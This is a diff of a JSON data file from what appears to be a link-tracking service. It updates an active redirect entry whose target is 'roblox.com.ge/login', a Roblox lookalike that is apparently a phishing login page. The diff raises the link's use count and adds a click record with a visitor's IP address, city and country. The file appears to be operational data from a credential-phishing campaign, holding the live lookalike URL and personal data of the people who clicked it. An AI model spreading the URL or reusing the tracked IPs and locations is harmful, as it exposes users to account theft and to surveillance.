@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1545,
+    "useCount": 1546,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12523,6 +12523,14 @@
       },
       {
         "timestamp": 1777449565315,
+        "ip": "39.194.5.120",
+        "country": "Indonesia",
+        "city": "Kota Banjarmasin",
+        "flag": "🇮🇩",
+        "countryCode": "ID"
+      },
+      {
+        "timestamp": 1777449571961,
         "ip": "39.194.5.120",
         "country": "Indonesia",
         "city": "Kota Banjarmasin",
